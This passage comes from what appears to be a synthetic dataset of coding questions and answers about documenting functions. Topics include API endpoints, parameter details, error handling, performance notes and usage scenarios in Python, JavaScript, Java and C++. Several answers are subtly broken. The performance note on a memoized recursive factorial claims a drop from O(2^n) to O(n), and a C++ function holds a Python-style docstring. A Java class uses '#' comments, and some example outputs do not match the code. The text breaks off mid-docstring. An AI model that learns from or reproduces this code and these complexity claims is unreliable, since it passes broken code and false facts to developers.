adjustments.\n\nExample:\n    >>> face_counter(\"sample_image.jpg\")\n    2\n\"\"\"\n\ndef face_counter(image_path):\n    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + \"haarcascade_frontalface_default.xml\")\n    img = cv2.imread(image_path)\n    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n    faces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))\n\n    return len(faces)\n\n# Example usage\nimage1_path = \"group_photo.jpg\"\nimage2_path = \"low_light_photo.jpg\"\n\nprint(f\"Faces in {image1_path}: {face_counter(image1_path)}\")\nprint(f\"Faces in {image2_path}: {face_counter(image2_path)}\")\n```\n**Concept: Documentation**"}, {"L2_TASK": "Document this function", "L3_TASK": "API endpoint documentation", "Complexity_Level": "medium", "Response": "Question 1:\nYou are given a Python function that serves as an API endpoint for retrieving user profiles from a database. Write a comprehensive documentation for this function, including explanations of its inputs, outputs, error handling, and an example usage.\n\n```python\ndef get_user_profile(user_id):\n    \"\"\"\n    Retrieves a user's profile from the database based on their unique ID.\n\n    Args:\n    user_id (int): The unique identifier of the user in the database. This should be a positive integer.\n\n    Returns:\n    dict: A dictionary containing the user's profile data such as name, email, and date of birth. The structure is as follows:\n    {\n        \"id\": int,\n        \"name\": str,\n        \"email\": str,\n        \"dob\": str (YYYY-MM-DD format)\n    }\n\n    Raises:\n    ValueError: If the provided user_id is not a positive integer or if the user is not found in the database.\n    DatabaseConnectionError: If there is an issue connecting to or querying the database.\n\n    Example:\n    >>> from user_service import get_user_profile\n    >>> try:\n    ...     profile = get_user_profile(1)\n    ...     print(profile)\n    ... except ValueError as e:\n    ...     print(f\"Error: {e}\")\n    ... except DatabaseConnectionError as e:\n    ...     print(f\"Error: {e}\")\n    {\n        \"id\": 1,\n        \"name\": \"John Doe\",\n        \"email\": \"johndoe@example.com\",\n        \"dob\": \"1990-01-01\"\n    }\n    \"\"\"\n    pass\n```\n\nQuestion 2:\nConsider a Node.js function that serves as an API endpoint to create new blog posts. Document the function, including its inputs, outputs, error scenarios, and a sample request.\n\n```javascript\n/**\n * Creates a new blog post in the database.\n *\n * @param {Object} req - The HTTP request object containing the post data.\n * @param {string} req.body.title - The title of the blog post. Required and should be a non-empty string.\n * @param {string} req.body.content - The content of the blog post. Required and should be a non-empty string.\n * @param {string} [req.body.authorId] - The ID of the author. Optional, if not provided the default author ID will be used.\n * @returns {Object} A response object containing the created blog post data and its unique ID.\n * @returns {number} res.status - The HTTP status code. 201 for success, 400 for bad request, 500 for internal server error.\n * @returns {Object} res.body - An object with the blog post data in the following structure:\n * {\n *   \"id\": number,\n *   \"title\": string,\n *   \"content\": string,\n *   \"authorId\": number,\n *   \"createdAt\": string (ISO 8601 format)\n * }\n * @throws {Error} If the request body is missing required fields or the database operation fails.\n *\n * Example:\n * ```\n * const express = require('express');\n * const app = express();\n * app.use(express.json());\n *\n * app.post('/api/posts', create_new_post, (req, res) => {\n *   console.log(res.body);\n * });\n *\n * const newPostData = {\n *   title: \"My First Blog Post\",\n *   content: \"Welcome to my blog!\",\n * };\n *\n * app.listen(3000, () => {\n *   app.request({\n *     method: 'POST',\n *     url: '/api/posts',\n *     body: newPostData,\n *   }).then(res => {}).catch(err => console.error(err));\n * });\n * ```\n */\nasync function create_new_post(req, res) {\n  // Function body to handle creating the post and responding with appropriate data\n}\n```"}, {"L2_TASK": "Document this function", "L3_TASK": "API endpoint documentation", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop an API endpoint for managing a complex financial transaction system, where multiple accounts, currencies, and exchange rates are involved. The endpoint should support depositing funds from one account to another, considering different currencies and applying real-time exchange rates. The documentation must clearly describe the input/output formats, error handling, and security measures.\n\n**Concept**: API endpoint documentation, RESTful API\n\n**Solution**:\n\n```python\nfrom fastapi import FastAPI, HTTPException\nfrom pydantic import BaseModel\nimport requests\n\napp = FastAPI()\n\nclass TransactionRequest(BaseModel):\n    from_account: str\n    to_account: str\n    amount: float\n    from_currency: str\n    to_currency: str\n\n@app.post(\"/transactions/deposit/\")\nasync def deposit_funds(request: TransactionRequest):\n    # Step 1: Validate input\n    if not validate_account(request.from_account) or not validate_account(request.to_account):\n        raise HTTPException(status_code=400, detail=\"Invalid account IDs\")\n\n    # Step 2: Fetch exchange rate\n    exchange_rate = fetch_exchange_rate(request.from_currency, request.to_currency)\n    if exchange_rate is None:\n        raise HTTPException(status_code=400, detail=\"Unsupported currency or no exchange rate available\")\n\n    # Step 3: Calculate final amount in to_currency\n    converted_amount = request.amount * exchange_rate\n\n    # Step 4: Perform the transaction\n    transaction_result = perform_transaction(request.from_account, request.to_account, converted_amount)\n    if not transaction_result:\n        raise HTTPException(status_code=400, detail=\"Transaction failed\")\n\n    # Step 5: Return transaction details\n    return {\n        \"transaction_id\": transaction_result[\"id\"],\n        \"from_account\": request.from_account,\n        \"to_account\": request.to_account,\n        \"from_currency\": request.from_currency,\n        \"to_currency\": request.to_currency,\n        \"amount\": request.amount,\n        \"converted_amount\": converted_amount\n    }\n\ndef validate_account(account_id: str):\n    # Implement account validation logic, e.g., check if account exists in the system\n    pass\n\ndef fetch_exchange_rate(from_currency: str, to_currency: str):\n    # Fetch real-time exchange rates from a reliable source, e.g., using an API\n    pass\n\ndef perform_transaction(from_account: str, to_account: str, amount: float):\n    # Implement transaction logic, including balance updates and error handling\n    pass\n```\n\n**API Documentation**:\n\n**Endpoint**: POST `/transactions/deposit/`\n\n**Request Body**: `TransactionRequest` (JSON)\n\n- `from_account`: Account ID of the sender (string, required)\n- `to_account`: Account ID of the recipient (string, required)\n- `amount`: Amount to transfer (float, required)\n- `from_currency`: Currency of the amount being transferred (string, required)\n- `to_currency`: Currency of the recipient's account (string, required)\n\n**Response**: JSON object containing transaction details\n\n- `transaction_id`: Unique identifier for the transaction (string)\n- `from_account`: Sender's account ID (string)\n- `to_account`: Recipient's account ID (string)\n- `from_currency`: Currency of the transferred amount (string)\n- `to_currency`: Currency of the recipient's account (string)\n- `amount`: The original amount being transferred (float)\n- `converted_amount`: The converted amount in `to_currency` (float)\n\n**Error Handling**: Returns HTTP error codes with detailed messages\n\n- 400 Bad Request: Invalid account IDs, unsupported currency, or no exchange rate available\n- 500 Internal Server Error: Transaction failed\n\n**Security Measures**:\n\n- Use HTTPS for secure communication\n- Validate account IDs and amounts to prevent unauthorized access or manipulation\n- Implement rate limiting and authentication for API requests"}, {"L2_TASK": "Document this function", "L3_TASK": "Function parameter details", "Complexity_Level": "medium", "Response": "**Question 1:**\nSuppose you have a function `calculate_sales_tax` in Python that takes in a dictionary representing an order with its items and their prices, and a boolean parameter indicating whether the order is from a tax-exempt customer or not. The function calculates and returns the total sales tax for the order. Write a detailed documentation for this function, including the function signature, description, input parameters, and return value.\n\n**Solution:**\n\n```python\ndef calculate_sales_tax(order: dict, is_tax_exempt: bool) -> float:\n    \"\"\"\n    Calculate the total sales tax for an order based on the items' prices and tax-exempt status.\n\n    Function Signature: calculate_sales_tax(order: dict, is_tax_exempt: bool) -> float\n\n    Parameters:\n    - order (dict): A dictionary containing the order details, where keys are item names and values are their prices.\n        Example: {'book': 12.99, 'pen': 0.99}\n    - is_tax_exempt (bool): Specifies whether the customer is tax exempt. If True, no tax is applied; if False, sales tax is calculated.\n\n    Return Value:\n    Returns a float representing the total sales tax for the order. If the order is tax exempt, the return value is 0.0.\n\n    Example:\n    >>> calculate_sales_tax({'book': 12.99, 'pen': 0.99}, False)\n    1.5\n\n    The sales tax rate is assumed to be 10%. In this example, the total sales tax for the order (excluding tax) is $1.50.\n    \"\"\"\n    # Implementation of the calculate_sales_tax function\n    total_price = sum(order.values())\n    if is_tax_exempt:\n        sales_tax = 0.0\n    else:\n        sales_tax_rate = 0.10  # 10%\n        sales_tax = total_price * sales_tax_rate\n    return sales_tax\n```\n\n**Question 2:**\nIn JavaScript, you have a function `calculateGeometricMean` that takes an array of numbers and returns the geometric mean of those numbers. Explain the documentation for this function, including its parameters and return value.\n\n**Solution:**\n\n```javascript\n/**\n * Calculates the geometric mean of an array of numbers.\n *\n * @param {number[]} numbers - An array of numbers for which to calculate the geometric mean.\n *   Example: [2, 3, 4, 5]\n * \n * @returns {number} The geometric mean of the input numbers. Returns NaN if the input array is empty or contains non-positive numbers.\n *   Example: The geometric mean of [2, 3, 4, 5] is approximately 3.381\n */\nfunction calculateGeometricMean(numbers) {\n    if (numbers.length === 0 || numbers.some(num => num <= 0)) {\n        return NaN;\n    }\n    \n    let product = 1;\n    for (let num of numbers) {\n        product *= num;\n    }\n    \n    return Math.pow(product, 1 / numbers.length);\n}\n```\n\nIn both solutions, the \"Concept\" keyword is {\"Concept\": \"Function\"} as the focus is on documenting a function and its parameters."}, {"L2_TASK": "Document this function", "L3_TASK": "Function parameter details", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a complex function in Python that performs a sequence of mathematical operations on multidimensional arrays using NumPy, provide detailed documentation for the function, its parameters, and return value. The function should take two multidimensional arrays as input and return a single array with the element-wise product after normalizing the input arrays.\n\nFunction:\n```python\nimport numpy as np\n\ndef normalize_multiply(arr1, arr2):\n    \"\"\"\n    Normalize the input multidimensional arrays and compute the element-wise product.\n\n    Parameters:\n    arr1 (numpy.ndarray): A multidimensional array of real numbers. Each element represents a value in the first dataset.\n    arr2 (numpy.ndarray): Another multidimensional array of real numbers with the same shape as arr1. Each element represents a value in the second dataset.\n\n    Returns:\n    numpy.ndarray: A new multidimensional array of the same shape as arr1 and arr2, containing the element-wise product of the normalized arrays.\n        The normalization is performed independently for each array, with values scaled between 0 and 1 according to their respective minimum and maximum values.\n\n    Examples:\n    >>> normalize_multiply(np.array([[1, 4], [7, 10]]), np.array([[2, 5], [8, 11]]))\n    array([[0.16666667, 0.40000001],\n           [0.57142857, 0.69230769]])\n    >>> normalize_multiply(np.array([[-3, 0, 5], [1, 2, -7]]), np.array([[4, -2, -1], [-6, 1, 8]]))\n    array([[-0.4, -0.4, 0.4],\n           [-0.25, 0.25, -0.4]])\n\n    Notes:\n    - The function does not modify the input arrays.\n    - NaN and infinite values in the input arrays are treated as zeros during normalization.\n    - If the input arrays have different shapes, a ValueError is raised.\n    \"\"\"\n    # Your implementation here\n```\nQuestion 2:\nDesign a C++ function that takes a dynamic 2D array of integers and its dimensions as parameters, performs a custom sorting algorithm on the array, and returns an updated 2D array. The sorting algorithm should be a hybrid of QuickSort and HeapSort, choosing the more efficient one based on the input size and structure. The function should be thoroughly documented with details about its parameters, return value, and algorithmic choices.\n\nFunction:\n```cpp\n#include <iostream>\n#include <vector>\n#include <algorithm>\n\nbool is_quick_sort_faster(int** array, int rows, int cols) {\n    // A helper function to determine if QuickSort is faster than HeapSort for the given array based on its size and structure\n    // Return true if QuickSort is expected to be faster, false otherwise\n    // Your implementation here\n}\n\ntemplate<typename T>\nstd::vector<std::vector<T>> hybrid_sort(int** input, int rows, int cols) {\n    \"\"\"\n    Perform a hybrid sorting algorithm (QuickSort for smaller subarrays and HeapSort for larger ones) on a dynamic 2D array.\n\n    Parameters:\n    input (int**): A dynamic 2D array of integers to be sorted.\n    rows (int): The number of rows in the input array.\n    cols (int): The number of columns in the input array.\n\n    Returns:\n    std::vector<std::vector<int>>: A new 2D vector containing the sorted integers.\n        The same dimensions as the input array are maintained.\n\n    Examples:\n    >>> hybrid_sort({{3, 1, 4}, {1, 5, 9}}, 2, 3)\n    {{1, 3, 4}, {1, 5, 9}}\n    >>> hybrid_sort({{5, 2, 9}, {1, 8, 4}, {3, 6, 7}}, 3, 3)\n    {{1, 2, 3}, {4, 5, 6}, {7, 8, 9}}\n\n    Notes:\n    - The input array is not modified.\n    - The function decides which sorting algorithm to use based on the array size and structure.\n    - If the input array is empty, the function returns an empty 2D vector.\n    \"\"\"\n    std::vector<std::vector<int>> sorted_array(rows, std::vector<int>(cols));\n\n    // Copy input array to the sorted_array vector\n    for (int i = 0; i < rows; i++) {\n        for (int j = 0; j < cols; j++) {\n            sorted_array[i].push_back(input[i][j]);\n        }\n    }\n\n    // Implement the hybrid sorting algorithm\n    for (int i = 0; i < rows; i++) {\n        if (is_quick_sort_faster(sorted_array[i].data(), 1, sorted_array[i].size())) {\n            // Implement QuickSort for the current row\n            // Your implementation here\n        } else {\n            // Implement HeapSort for the current row\n            // Your implementation here\n        }\n    }\n\n    return sorted_array;\n}\n```\nThese questions are designed to test the candidate's understanding of documentation, multidimensional arrays, NumPy in Python, sorting algorithms, and dynamic 2D arrays in C++."}, {"L2_TASK": "Document this function", "L3_TASK": "Error handling documentation", "Complexity_Level": "medium", "Response": "Question 1:\nGiven a Python function `fetch_data(url: str) -> dict` that fetches JSON data from a given URL using `requests.get`. The function should handle potential errors like invalid URLs, timeouts, and connectivity issues. Document the function with proper error handling description.\n\n```python\nimport requests\n\ndef fetch_data(url: str) -> dict:\n    \"\"\"\n    Fetches JSON data from the specified URL using requests.get.\n\n    Args:\n    url (str): The URL to fetch the JSON data from.\n\n    Returns:\n    dict: A dictionary containing the parsed JSON data.\n\n    Raises:\n    ValueError: If the provided URL is not valid or empty.\n    requests.exceptions.Timeout: If the request times out.\n    requests.exceptions.ConnectionError: If there's a problem with the network connection.\n    requests.exceptions.HTTPError: If the server responds with an HTTP status code indicating an error.\n\n    Example:\n    >>> fetch_data('https://jsonplaceholder.typicode.com/todos/1')\n    {'userId': 1, 'id': 1, 'title': 'delectus aut autem', 'completed': False}\n    \"\"\"\n\n    if not url or url == \"\":\n        raise ValueError(\"Invalid or empty URL\")\n\n    try:\n        response = requests.get(url, timeout=5)\n        response.raise_for_status()\n    except requests.exceptions.Timeout:\n        raise requests.exceptions.Timeout(\"Request timed out.\")\n    except requests.exceptions.ConnectionError as ce:\n        raise requests.exceptions.ConnectionError(\"Network connection error: \", ce)\n    except requests.exceptions.HTTPError as he:\n        raise requests.exceptions.HTTPError(f\"HTTP error occurred: {he}\")\n\n    return response.json()\n```\n\nQuestion 2:\nIn JavaScript, write a function `fetchUserData(userId: number)` that fetches user data from an API endpoint using the Fetch API. Document the function to explain how it handles errors like failed requests, invalid responses, and incorrect input.\n\n```javascript\nasync function fetchUserData(userId: number) {\n    /**\n     * Fetches user data from a given API endpoint using Fetch API.\n     *\n     * @param {number} userId - The ID of the user to fetch data for. Must be a non-negative integer.\n     * @returns {Promise<Object>} A Promise resolving to the user data as an object.\n     * @throws {TypeError} If userId is not a number or is negative.\n     * @throws {Error} If the fetch request fails.\n     * @throws {TypeError} If the response is not valid JSON.\n     *\n     * Example:\n     * ```\n     * try {\n     *   const user = await fetchUserData(1);\n     *   console.log(user);\n     * } catch (error) {\n     *   console.error(error);\n     * }\n     * ```\n     */\n\n    if (typeof userId !== 'number' || userId < 0) {\n        throw new TypeError('Invalid userId. Must be a non-negative integer.');\n    }\n\n    try {\n        const response = await fetch(`https://api.example.com/users/${userId}`);\n        if (!response.ok) {\n            throw new Error(`Failed to fetch user data: ${response.statusText}`);\n        }\n        const userData = await response.json();\n        if (typeof userData !== 'object' || userData === null) {\n            throw new TypeError('Invalid response data. Expected a JSON object.');\n        }\n        return userData;\n    } catch (error) {\n        throw new Error('An error occurred while fetching user data: ', error);\n    }\n}\n```"}, {"L2_TASK": "Document this function", "L3_TASK": "Error handling documentation", "Complexity_Level": "extremely difficult", "Response": "Problem 1:\nGiven a function that performs complex file operations and potentially throws various exceptions, document the function with detailed error handling documentation. The function reads a CSV file, performs calculations on the data, and writes the result to another CSV file. It may encounter errors such as file not found, invalid CSV format, memory limitations, or arithmetic errors.\n\n```python\ndef process_data(input_file: str, output_file: str) -> None:\n    \"\"\"Process data from a CSV file, perform calculations, and write results to another CSV file.\n\n    Args:\n    input_file (str): Path to the input CSV file.\n    output_file (str): Path to the output CSV file.\n\n    Raises:\n    FileNotFoundError: The input_file does not exist.\n    CSVError: The input_file is not a valid CSV or has missing columns.\n    MemoryError: Insufficient memory to load the dataset.\n    ValueError: An arithmetic error occurred during calculations.\n    PermissionError: Insufficient permissions to write to the output_file.\n\n    Note:\n    This function assumes the input CSV has a header and two columns: 'A' and 'B'.\n    It calculates the product of column 'A' and 'B' for each row and writes the result to the output CSV.\n\n    Example:\n    Suppose the input file 'data.csv' has the following content:\n    A,B\n    1,2\n    3,4\n    5,6\n\n    The output file 'result.csv' would contain:\n    A,B,Product\n    1,2,2\n    3,4,12\n    5,6,30\n    \"\"\"\n    try:\n        data = load_csv(input_file)\n    except FileNotFoundError:\n        print(f\"Error: {input_file} not found.\")\n        raise\n    except CSVError:\n        print(\"Error: Invalid CSV format or missing columns.\")\n        raise\n\n    try:\n        processed_data = process_dataframe(data)\n    except MemoryError:\n        print(\"Error: Insufficient memory to process data.\")\n        raise\n    except ValueError as e:\n        print(f\"Error: Arithmetic error - {str(e)}\")\n        raise\n\n    try:\n        write_csv(output_file, processed_data)\n    except PermissionError:\n        print(\"Error: Permission denied while writing to output file.\")\n        raise\n```\nProblem 2:\nDocument a function that fetches data from an API, parses the JSON response, and handles various network and parsing errors. The function should return a dictionary if successful, or raise exceptions for different types of errors.\n\n```python\nimport requests\n\ndef fetch_and_parse_data(api_url: str) -> dict:\n    \"\"\"Fetch data from an API, parse the JSON response, and return a dictionary.\n\n    Args:\n    api_url (str): The URL of the API endpoint.\n\n    Returns:\n    dict: A dictionary containing the parsed JSON data.\n\n    Raises:\n    ConnectionError: A network error occurred while connecting to the API.\n    Timeout: The API request timed out.\n    HTTPError: The API returned an unsuccessful HTTP status code (e.g., 400, 500).\n    JSONDecodeError: The API response could not be decoded as JSON.\n\n    Example:\n    api_url = 'https://api.example.com/data'\n    try:\n        data = fetch_and_parse_data(api_url)\n        print(data)\n    except (ConnectionError, Timeout, HTTPError, JSONDecodeError) as e:\n        print(f\"Error: {type(e).__name__} - {str(e)}\")\n    \"\"\"\n    try:\n        response = requests.get(api_url, timeout=10)\n        response.raise_for_status()  # Raise HTTPError for non-2xx status codes\n    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:\n        print(f\"Error: {type(e).__name__} - {str(e)}\")\n        raise\n    except requests.exceptions.HTTPError as e:\n        print(f\"Error: HTTPError - {str(e)}\")\n        raise\n\n    try:\n        return response.json()\n    except JSONDecodeError as e:\n        print(f\"Error: JSONDecodeError - {str(e)}\")\n        raise\n```\nConcept: Error Handling Documentation"}, {"L2_TASK": "Document this function", "L3_TASK": "Performance notes", "Complexity_Level": "medium", "Response": "Question 1: Write a function to calculate the factorial of a non-negative integer, `n`. Include performance notes and example code in Python.\n\n**Concept**: Performance Optimization, Function\n\n**Performance Notes**: The naive approach to calculating the factorial using recursion can be inefficient and may cause a stack overflow for large `n`. The iterative approach presented here avoids recursion and reduces the time complexity to O(n), which is more efficient.\n\n```python\ndef iterative_factorial(n):\n    \"\"\"\n    Computes the factorial of a non-negative integer n iteratively to optimize performance.\n\n    :param n: The non-negative integer for which to calculate the factorial.\n    :return: The factorial of n.\n\n    Performance:\n    - Time complexity: O(n)\n    - Space complexity: O(1)\n    - Avoids recursion, hence no risk of stack overflow for large n.\n    \"\"\"\n    if n < 0:\n        raise ValueError(\"Input must be a non-negative integer.\")\n    elif n == 0 or n == 1:\n        return 1\n    else:\n        result = 1\n        for i in range(1, n + 1):\n            result *= i\n        return result\n\n# Example usage\nprint(iterative_factorial(5))  # Output: 120\n```\n\nQuestion 2: Implement a function to find the first `n` prime numbers in a more optimized way. Include performance notes and example code in Python.\n\n**Concept**: Algorithm, Performance Optimization\n\n**Performance Notes**: The Sieve of Eratosthenes algorithm is used here to efficiently find the first `n` prime numbers. It has a time complexity of O(n log log n), which is significantly faster than the naive approach of checking each number for primality.\n\n```python\ndef sieve_of_eratosthenes(n):\n    \"\"\"\n    Finds the first n prime numbers using the Sieve of Eratosthenes algorithm.\n\n    :param n: The number of prime numbers to find.\n    :return: A list of the first n prime numbers.\n\n    Performance:\n    - Time complexity: O(n log log n)\n    - Space complexity: O(n)\n    - Utilizes the Sieve of Eratosthenes for efficient prime number generation.\n    \"\"\"\n    if n <= 0:\n        raise ValueError(\"Input must be a positive integer.\")\n    primes = []\n    sieve = [True] * (n * int(math.sqrt(n) + 1))  # Assuming n primes are less than n*sqrt(n)\n    sieve[0:2] = [False, False]\n\n    for i, is_prime in enumerate(sieve):\n        if is_prime:\n            primes.append(i)\n            for multiple in range(i*i, len(sieve), i):\n                sieve[multiple] = False\n\n        if len(primes) == n:\n            break\n\n    return primes\n\n# Example usage\nprint(sieve_of_eratosthenes(10))  # Output: [2, 3, 5, 7, 11, 13, 17, 19, 23, 29]\n```\n\nIn both questions, performance optimization is the key focus, discussing time and space complexities and implementing efficient algorithms to solve the problems."}, {"L2_TASK": "Document this function", "L3_TASK": "Performance notes", "Complexity_Level": "extremely difficult", "Response": "Problem 1: Document a highly optimized recursive function for calculating the factorial of a large number using memoization to reduce computation time.\n\n**Concept:** Memoization, Recursion, Optimization\n\n```python\n# Function to calculate the factorial of a number using memoization\ndef memoize(func):\n    cache = {}\n\n    def wrapper(n):\n        if n not in cache:\n            cache[n] = func(n)\n        return cache[n]\n    return wrapper\n\n@memoize\ndef factorial(n):\n    if n == 0 or n == 1:\n        return 1\n    else:\n        return n * factorial(n - 1)\n\n# Performance notes:\n# - This function utilizes memoization to store previously computed factorials in a dictionary, reducing the time complexity\n#   from O(2^n) to O(n) by avoiding redundant calculations for the same input.\n# - The @memoize decorator ensures that the function call is only made for unseen inputs, leading to significant performance\n#   improvements when dealing with large numbers.\n# - However, the memory consumption grows linearly with the input size, as all computed factorials are stored in memory.\n# - This optimized implementation is suitable for numbers where the memory overhead is acceptable compared to the time savings.\n\n# Example usage:\nprint(factorial(1000))  # Output: Large factorial number\n```\n\nProblem 2: Document a highly optimized parallelized function for processing a massive dataset using MapReduce in the Hadoop framework.\n\n**Concept:** MapReduce, Distributed Computing, Optimization\n\n```java\n// Hadoop MapReduce Job for processing a large dataset\nimport org.apache.hadoop.conf.Configuration;\nimport org.apache.hadoop.fs.Path;\nimport org.apache.hadoop.io.IntWritable;\nimport org.apache.hadoop.io.Text;\nimport org.apache.hadoop.mapreduce.Job;\nimport org.apache.hadoop.mapreduce.Mapper;\nimport org.apache.hadoop.mapreduce.Reducer;\nimport org.apache.hadoop.mapreduce.lib.input.FileInputFormat;\nimport org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;\n\npublic class MassiveDatasetProcessing {\n\n    // Mapper class\n    public static class TokenizerMapper extends Mapper<Object, Text, Text, IntWritable> {\n        private final static IntWritable one = new IntWritable(1);\n        private Text word = new Text();\n\n        @Override\n        protected void map(Object key, Text value, Context context) throws IOException, InterruptedException {\n            // Complex preprocessing logic for each line (e.g., parsing, filtering, etc.)\n            String[] tokens = value.toString().split(\"\\\\s+\");\n            for (String token : tokens) {\n                word.set(token);\n                context.write(word, one);\n            }\n        }\n    }\n\n    // Reducer class\n    public static class IntSumReducer extends Reducer<Text, IntWritable, Text, IntWritable> {\n        private IntWritable result = new IntWritable();\n\n        @Override\n        protected void reduce(Text key, Iterable<IntWritable> values, Context context) throws IOException, InterruptedException {\n            int sum = 0;\n            for (IntWritable val : values) {\n                sum += val.get();\n            }\n            result.set(sum);\n            context.write(key, result);\n        }\n    }\n\n    // Main method to configure and run the job\n    public static void main(String[] args) throws Exception {\n        Configuration conf = new Configuration();\n        Job job = Job.getInstance(conf, \"massive dataset processing\");\n        job.setJarByClass(MassiveDatasetProcessing.class);\n        job.setMapperClass(TokenizerMapper.class);\n        job.setCombinerClass(IntSumReducer.class);\n        job.setReducerClass(IntSumReducer.class);\n        job.setOutputKeyClass(Text.class);\n        job.setOutputValueClass(IntWritable.class);\n        FileInputFormat.addInputPath(job, new Path(args[0]));\n        FileOutputFormat.setOutputPath(job, new Path(args[1]));\n        System.exit(job.waitForCompletion(true) ? 0 : 1);\n    }\n\n    // Performance notes:\n    # - This MapReduce job processes a massive dataset by dividing the workload into smaller chunks (splits) that can be\n    #   processed in parallel on a cluster of machines, significantly reducing the overall processing time.\n    # - The Mapper performs the preprocessing and emits key-value pairs, while the Reducer aggregates the results.\n    # - By using combiners, the amount of data transferred between nodes is reduced, further optimizing the performance.\n    # - However, the efficiency heavily depends on cluster configuration, network latency, and data distribution.\n    # - Additionally, MapReduce jobs incur overhead due to shuffle and sort phases, which might be a bottleneck for very\n    #   large datasets. Consider alternative frameworks like Apache Spark for better performance in such cases.\n}\n\n```\n\nIn this example, the MapReduce job is designed to process a large dataset by tokenizing the input text, counting the occurrences of each token, and then aggregating the counts. The performance notes describe how the parallel nature of MapReduce and the use of combiners contribute to optimization, but also mention potential bottlenecks and alternatives for further improvement."}, {"L2_TASK": "Document this function", "L3_TASK": "Usage scenarios", "Complexity_Level": "medium", "Response": "Question 1:\nGiven a function `processOrder(orderData: dict) -> None` that handles order processing in an e-commerce application, provide a brief documentation for the function and a usage scenario demonstrating its application.\n\n```python\ndef processOrder(orderData: dict) -> None:\n    \"\"\"\n    Processes an order by validating the data, creating a record in the database, and sending a confirmation email.\n\n    Args:\n    orderData (dict): A dictionary containing the order details. Expected keys:\n        - 'customerId' (int): Unique identifier of the customer.\n        - 'items' (list): A list of dictionaries with each item's details:\n            {\n                'productId' (int): Unique identifier of the product,\n                'quantity' (int): Number of items ordered,\n                'price' (float): Price of the product per unit\n            }\n        - 'shippingAddress' (str): The address for shipping the order.\n        - 'billingEmail' (str): Customer's email address for billing.\n\n    Raises:\n    ValueError: If the required keys are missing from the `orderData` or the data is invalid.\n    \"\"\"\n    # Function implementation: validate data, insert into database, and send email\n\n# Usage Scenario\n# Customer with ID 12345 wants to order three items with the following details:\nitems = [\n    {\"productId\": 67890, \"quantity\": 1, \"price\": 19.99},\n    {\"productId\": 12367, \"quantity\": 2, \"price\": 9.99},\n    {\"productId\": 56789, \"quantity\": 1, \"price\": 14.99}\n]\norder_data = {\n    \"customerId\": 12345,\n    \"items\": items,\n    \"shippingAddress\": \"123 Main St, Anytown\",\n    \"billingEmail\": \"customer@example.com\"\n}\n\ntry:\n    processOrder(orderData=order_data)\n    print(\"Order processed successfully.\")\nexcept ValueError as e:\n    print(f\"Error processing order: {str(e)}\")\n```\n\nQuestion 2:\nConsider a function `processSensorData(data: list) -> None` that collects and analyzes sensor data in an industrial IoT system. Document the function and provide a usage example.\n\n```python\ndef processSensorData(data: list) -> None:\n    \"\"\"\n    Analyzes a list of sensor readings, calculates the average, and triggers alerts if values exceed predefined thresholds.\n\n    Args:\n    data (list): A list of sensor readings as floating-point numbers.\n\n    Raises:\n    ValueError: If the `data` list is empty or contains non-numeric values.\n    Alert: A custom exception raised when a sensor reading exceeds the threshold. \n        Attributes:\n            sensor_id (int): ID of the sensor that triggered the alert.\n            value (float): The reading that exceeded the threshold.\n    \"\"\"\n    # Function implementation: calculate average, check for thresholds, and raise alerts if necessary\n\n# Usage Scenario\n# Assume we have sensors with IDs 1, 2, and 3, and a threshold of 100 for sensor readings\nsensor_data = [98.2, 102.5, 99.7]\n\ntry:\n    processSensorData(data=sensor_data)\nexcept Alert as e:\n    print(f\"Alert: Sensor {e.sensor_id} reading {e.value} exceeded the threshold.\")\nexcept ValueError as e:\n    print(f\"Error processing sensor data: {str(e)}\")\n```\n\nConcept: \"Function\""}, {"L2_TASK": "Document this function", "L3_TASK": "Usage scenarios", "Complexity_Level": "extremely difficult", "Response": "Question 1: Given a complex function `processBigData` that handles massive datasets, generates multiple reports, and applies machine learning algorithms, provide an example of its usage scenario, including detailed documentation and sample input/output.\n\n```python\ndef processBigData(data, report_types, model, preprocessing=None, parallelism=4):\n    \"\"\"\n    Processes large datasets, generates requested reports, and applies a specified machine learning model.\n\n    Args:\n        data (pandas.DataFrame): A massive dataframe containing various features and labels.\n        report_types (list of str): A list of report types to generate (e.g., 'Correlation', 'Regression', 'Clustering').\n        model (sklearn.model_selection.BaseEstimator): A trained machine learning model to be applied.\n        preprocessing (function, optional): A preprocessing function to transform data before applying the model. Defaults to None.\n        parallelism (int, optional): The number of worker processes for parallel execution. Defaults to 4.\n\n    Returns:\n        dict: A dictionary containing the generated reports and the model's predictions.\n\n    Usage Scenario:\n    Suppose we have a large dataset of customer transactions and wish to analyze spending patterns using a pre-trained clustering model.\n\n    Sample Input:\n    data = pandas.read_csv('transactions.csv')\n    report_types = ['Correlation', 'PCA', 'KMeans']\n    model = load_model('clustering_model.pkl')\n\n    preprocess_data = lambda df: df.dropna()  # Simple preprocessing: remove NaN rows\n\n    Output:\n    {\n        'Correlation': {\n            'matrix': <numpy.ndarray>,  # Correlation matrix\n            'plot': 'correlation_plot.png'  # Path to the correlation plot image\n        },\n        'PCA': {\n            'components': <numpy.ndarray>,  # Principal components\n            'explained_variance': <numpy.ndarray>  # Explained variance by each component\n        },\n        'KMeans': {\n            'labels': <numpy.ndarray>,  # Cluster labels for each transaction\n            'centers': <numpy.ndarray>,  # Centroids of the clusters\n            'plot': 'kmeans_plot.png'  # Path to the KMeans plot image\n        },\n        'Predictions': <numpy.ndarray>  # Model predictions for the transactions\n    }\n\n    In this scenario, 'processBigData' is used to generate correlation, PCA, and KMeans reports on transaction data. The 'clustering_model.pkl' is loaded and applied to the data after removing rows with NaN values. The results include various analysis outputs and a visual representation of the clustering.\n    \"\"\"\n    # Implementation of processBigData function goes here\n```\n\nConcept: Documentation\n\nQuestion 2: Consider a high-performance scientific application using a complex function `calculateQuantumProbability` that computes the probability of a quantum state transition. Document a usage scenario with a detailed explanation and sample code in C++.\n\n```cpp\n#include <vector>\n#include <complex>\n#include <Eigen/Dense>\n\n/**\n * Calculates the probability of a quantum state transition from |initial\u27e9 to |final\u27e9.\n *\n * @param initialState A column vector representing the initial state of the quantum system.\n * @param finalState A column vector representing the final state of the quantum system.\n * @param hamiltonian A square matrix representing the Hamiltonian of the system.\n *\n * @return The probability of the 